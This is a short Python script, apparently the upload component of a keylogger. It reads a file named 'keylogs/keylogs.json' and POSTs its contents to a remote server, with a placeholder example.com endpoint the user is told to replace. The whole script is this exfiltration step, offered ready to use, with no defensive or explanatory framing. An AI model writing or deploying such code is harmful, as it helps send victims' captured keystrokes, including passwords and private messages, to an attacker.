import requests
import os
import json

class RemoteCommunicator:
    def __init__(self, endpoint_url, file_path):
        self.endpoint_url = endpoint_url
        self.file_path = file_path

    def send_logs(self):
        if not os.path.exists(self.file_path):
            print("[!] Log file not found. Skipping upload.")
            return

        try:
            with open(self.file_path, 'r', encoding='utf-8') as file:
                log_data = json.load(file)

            response = requests.post(
                self.endpoint_url,
                json=log_data,
                headers={"Content-Type": "application/json"}
            )

            if response.status_code == 200:
                print("[✔] Log data successfully sent to remote server.")
            else:
                print(f"[✘] Failed to send log data. Status code: {response.status_code}")

        except Exception as e:
            print(f"[✘] Error sending logs: {e}")


# Example usage
if __name__ == "__main__":
    communicator = RemoteCommunicator(
        endpoint_url="https://example.com/api/receive-logs",  # Replace with your actual endpoint
        file_path="keylogs/keylogs.json"
    )
    communicator.send_logs()
